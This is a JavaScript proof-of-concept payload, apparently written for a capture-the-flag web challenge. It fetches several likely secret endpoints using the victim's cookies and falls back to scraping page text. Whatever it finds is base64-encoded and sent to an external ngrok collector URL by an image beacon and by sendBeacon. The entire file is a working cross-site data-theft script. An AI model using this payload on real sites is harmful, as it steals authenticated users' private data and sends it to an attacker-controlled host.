// poc.js — try several likely flag endpoints and exfiltrate to a public collector
(async () => {
  try {
    // endpoints to try (add any others you want)
    const endpoints = [
      '/flag',
      '/api/flag',
      '/api/secret',
      '/secret',
      '/admin/flag'
    ];

    let flagText = '';

    for (const ep of endpoints) {
      try {
        const r = await fetch(ep, { credentials: 'include', redirect: 'follow' });
        if (!r.ok) continue;
        const txt = await r.text();
        // basic heuristic: contains "flag{" or "FLAG{" or reasonably long text
        if (txt && (txt.includes('flag{') || txt.includes('FLAG{') || txt.length > 5)) {
          flagText = txt.trim();
          break;
        }
      } catch (e) {
        // ignore per-endpoint errors
      }
    }

    if (!flagText) {
      // fallback: try to read visible page content (sometimes flag is in DOM)
      try {
        flagText = document.body && document.body.innerText ? document.body.innerText.slice(0, 500) : '';
      } catch (e) {}
    }

    if (!flagText) {
      console.log('[poc] no obvious flag found');
      return;
    }

    console.log('[poc] found:', flagText);

    // short-unique path for collector and use HTTPS
    const COLLECTOR = 'https://unrounded-princeton-overcostly.ngrok-free.dev/collect/ctf-abc123';
    // small payload: base64-encode the flag to be URL-safe
    const payload = encodeURIComponent(btoa(flagText));

    // send using an image beacon (GET) — works without CORS
    const img = new Image();
    img.src = `${COLLECTOR}?f=${payload}&r=${encodeURIComponent(location.href)}`;

    // also attempt navigator.sendBeacon (POST) — may/may-not be accepted by server
    try {
      const blob = new Blob([JSON.stringify({flag: flagText, url: location.href})], {type: 'application/json'});
      navigator.sendBeacon && navigator.sendBeacon(COLLECTOR, blob);
    } catch (e) {}

  } catch (err) {
    console.error('[poc] error', err);
  }
})();
